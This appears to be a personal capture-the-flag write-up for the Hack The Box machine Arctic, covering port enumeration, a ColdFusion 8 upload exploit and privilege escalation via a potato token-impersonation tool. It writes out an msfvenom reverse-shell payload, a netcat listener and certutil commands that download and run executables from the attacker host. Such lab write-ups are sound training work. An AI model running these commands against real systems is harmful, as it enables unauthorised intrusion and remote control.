# Enumeration 

## open ports


```
Discovered open port 135/tcp on 10.129.78.89
Discovered open port 49154/tcp on 10.129.78.89
Discovered open port 8500/tcp on 10.129.78.89

```

### Port 8500

![[Pasted image 20230119071113.png]]
![[Pasted image 20230119071125.png]]
![[Pasted image 20230119071138.png]]

searchsploit cold fusion 8
![[Pasted image 20230119071515.png]]


# Foothold 
[jsp rev shell ](https://raw.githubusercontent.com/LaiKash/JSP-Reverse-and-Web-Shell/main/shell.jsp)
using [cf8-upload.py](https://github.com/p1ckzi/CVE-2009-2265/blob/main/cf8-upload.py)
run it


![[Pasted image 20230119073147.png]]
![[Pasted image 20230119073247.png]]


# Privesc 


![[Pasted image 20230119073310.png]]

potato time

On attacker:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.19 LPORT=9002 -f exe -o rev.exe
nc -lvnp 9002
```

On Target:
```
certutil -urlcache -f http://10.10.16.19/rev.exe rev.exe
certutil -urlcache -f http://10.10.16.19/jp.exe jp.exe
.\jp.exe -t * -p rev.exe -l 9257
```

![[Pasted image 20230119073553.png]]
![[Pasted image 20230119073737.png]]



---
Tags: #ctf #htb #potato #cold_fusion_8 #Token_impersonation 
Resources: [Arctic](https://app.hackthebox.com/machines/9)
